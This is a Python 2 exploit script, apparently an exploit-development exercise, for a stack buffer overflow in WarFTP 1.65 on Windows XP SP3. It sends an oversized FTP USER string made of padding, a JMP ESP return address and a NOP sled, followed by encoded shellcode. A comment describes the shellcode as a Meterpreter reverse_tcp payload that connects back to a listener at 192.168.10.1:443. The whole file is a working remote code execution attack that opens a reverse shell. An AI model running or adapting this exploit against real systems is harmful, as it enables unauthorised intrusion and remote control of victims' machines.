#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development warftp 1.65

import sys
import socket 

def fuzzing(hostname):

	#Target : Windows XP sp3
	#dll    : user32.dll 
	#ret    : 0x7e429353
	#badchar: '\x00\x0a\x0d' 

	# payload: window/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=443
	shellcode = ("\xbf\x92\x72\x25\x6d\xda\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
	"\x49\x31\x7a\x14\x03\x7a\x14\x83\xc2\x04\x70\x87\xd9\x85\xfd"
	"\x68\x22\x56\x9d\xe1\xc7\x67\x8f\x96\x8c\xda\x1f\xdc\xc1\xd6"
	"\xd4\xb0\xf1\x6d\x98\x1c\xf5\xc6\x16\x7b\x38\xd6\x97\x43\x96"
	"\x14\xb6\x3f\xe5\x48\x18\x01\x26\x9d\x59\x46\x5b\x6e\x0b\x1f"
	"\x17\xdd\xbb\x14\x65\xde\xba\xfa\xe1\x5e\xc4\x7f\x35\x2a\x7e"
	"\x81\x66\x83\xf5\xc9\x9e\xaf\x51\xea\x9f\x7c\x82\xd6\xd6\x09"
	"\x70\xac\xe8\xdb\x49\x4d\xdb\x23\x05\x70\xd3\xa9\x54\xb4\xd4"
	"\x51\x23\xce\x26\xef\x33\x15\x54\x2b\xb6\x88\xfe\xb8\x60\x69"
	"\xfe\x6d\xf6\xfa\x0c\xd9\x7d\xa4\x10\xdc\x52\xde\x2d\x55\x55"
	"\x31\xa4\x2d\x71\x95\xec\xf6\x18\x8c\x48\x58\x25\xce\x35\x05"
	"\x83\x84\xd4\x52\xb5\xc6\xb0\x97\x8b\xf8\x40\xb0\x9c\x8b\x72"
	"\x1f\x36\x04\x3f\xe8\x90\xd3\x40\xc3\x64\x4b\xbf\xec\x94\x45"
	"\x04\xb8\xc4\xfd\xad\xc1\x8f\xfd\x52\x14\x1f\xae\xfc\xc7\xdf"
	"\x1e\xbd\xb7\xb7\x74\x32\xe7\xa7\x76\x98\x80\x4d\x8c\x4b\x6f"
	"\x39\x84\x8a\x07\x3b\x99\x8d\x6c\xb2\x7f\xe7\x82\x92\x28\x90"
	"\x3b\xbf\xa3\x01\xc3\x6a\xce\x02\x4f\x98\x2e\xcc\xb8\xd5\x3c"
	"\xb9\x48\xa0\x1f\x6c\x56\x1f\x35\x91\xc2\x9b\x9c\xc6\x7a\xa1"
	"\xf9\x21\x25\x5a\x2c\x3a\xec\xce\x8f\x55\x11\x1e\x10\xa6\x47"
	"\x74\x10\xce\x3f\x2c\x43\xeb\x3f\xf9\xf7\xa0\xd5\x01\xae\x15"
	"\x7d\x69\x4c\x43\x49\x36\xaf\xa6\x4b\x0b\x66\x8f\xc9\x7d\x0c"
	"\xe3\x11")

	ret    = "\x53\x93\x42\x7E"  #7E429353 JMP ESP
	password = "user"
	username = '\x41' * 246 + ret + '\x90' * 15 + shellcode 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	print response 

	connect.close()

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target>' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)
